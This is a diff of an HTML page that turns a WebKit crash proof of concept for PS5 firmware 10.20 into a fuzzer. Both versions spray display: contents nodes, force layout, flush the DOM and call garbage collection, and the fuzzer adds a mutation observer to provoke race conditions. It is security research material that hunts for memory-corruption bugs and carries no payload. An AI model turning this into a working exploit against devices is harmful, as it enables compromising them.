@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit Crash PoC - PS5 FW 10.20</title>
+  <title>WebKit PS5 Fuzzer - display: contents</title>
   <style>
     body {
-      font-family: monospace;
       background: #000;
       color: #0f0;
+      font-family: monospace;
     }
     #log {
       white-space: pre;
@@ -14,50 +14,82 @@
   </style>
 </head>
 <body>
-  <div id="log">[+] Running PoC...</div>
+  <div id="log">[+] Starting fuzzer...\n</div>
 
   <script>
-    const log = (msg) => document.getElementById("log").textContent += `\n${msg}`;
+    const log = (msg) => {
+      document.getElementById('log').textContent += msg + '\n';
+    };
 
-    function sprayDOM(depth) {
-      for (let i = 0; i < depth; i++) {
-        let outer = document.createElement("div");
-        outer.style.display = "contents";
+    let runCount = 0;
+    let keepFuzzing = true;
 
-        for (let j = 0; j < 10; j++) {
-          let child = document.createElement("span");
-          child.textContent = "CrashMe" + j;
-          outer.appendChild(child);
-        }
-
-        document.body.appendChild(outer);
-
-        // Forzar layout y luego eliminar en distintos momentos
-        getComputedStyle(outer).color;
-        if (i % 3 === 0) outer.remove(); // parcial
-        if (i % 7 === 0) document.body.innerHTML = ""; // full flush
+    function createRandomNode() {
+      let d = document.createElement('div');
+      d.style.display = 'contents';
+      for (let i = 0; i < Math.random() * 10; i++) {
+        let s = document.createElement('span');
+        s.textContent = 'FUZZ' + Math.random();
+        d.appendChild(s);
       }
+      return d;
     }
 
-    function loopSpray() {
-      log("[*] Starting aggressive spray...");
-      let i = 0;
-      const interval = setInterval(() => {
-        sprayDOM(1000);
+    function fuzzCycle() {
+      if (!keepFuzzing) return;
 
-        try {
-          if (window.gc) window.gc(); // Forzar GC si está disponible
-        } catch (e) {}
+      try {
+        let container = document.createElement('div');
+        container.id = 'container_' + runCount;
+        document.body.appendChild(container);
 
-        log(`[+] Cycle ${i++} done`);
-        if (i > 20) {
-          clearInterval(interval);
-          log("[!] PoC completed. If no crash, patch may be in place.");
+        // Spray nodes
+        for (let i = 0; i < 500; i++) {
+          let node = createRandomNode();
+          container.appendChild(node);
         }
-      }, 250);
+
+        // Trigger layout
+        [...container.querySelectorAll('span')].forEach(el => {
+          getComputedStyle(el).color;
+        });
+
+        // Randomize removal
+        if (runCount % 2 === 0) {
+          container.innerHTML = '';
+        } else {
+          container.remove();
+        }
+
+        // Occasionally clear entire DOM
+        if (runCount % 5 === 0) {
+          document.body.innerHTML = '<div id="log">[+] Reset DOM</div>';
+        }
+
+        // Force GC if available
+        if (window.gc) window.gc();
+
+        log(`[+] Fuzz cycle ${runCount} complete`);
+
+        runCount++;
+      } catch (e) {
+        log('[!] Exception: ' + e.message);
+      }
+
+      setTimeout(fuzzCycle, 50);
     }
 
-    setTimeout(loopSpray, 1000);
+    // Optional: DOM mutation observer to add race conditions
+    const observer = new MutationObserver(() => {
+      if (Math.random() < 0.5) {
+        document.body.innerHTML = '<div id="log">[+] Mutation Reset</div>';
+      }
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    // Start
+    setTimeout(fuzzCycle, 500);
   </script>
 </body>
 </html>
